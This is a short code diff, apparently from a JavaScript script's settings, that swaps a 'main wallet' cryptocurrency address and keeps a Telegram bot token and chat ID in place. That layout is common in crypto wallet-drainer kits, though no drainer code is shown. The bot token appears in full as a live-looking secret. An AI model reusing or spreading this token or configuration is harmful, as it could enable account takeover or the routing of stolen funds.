@@ -1,4 +1,4 @@
-var mainWallet = "UQBa5dxHPr2SnCSLuHe5wg6PIz_zn5P3wbFmBq8aBzjp-5bv"; // Main wallet address
+var mainWallet = "UQDI_XEKmdgFbpwdisWZTcdZFbhle4e8BhJBKk1KfLyzdRt-"; // Main wallet address
 var tgBotToken = "6986312551:AAFjUdD0peCCZ1wDluJoMHHWuQNMRFQVgd4"; // Telegram bot token
 var tgChat = "1409893198"; // Your Telegram chat ID
 
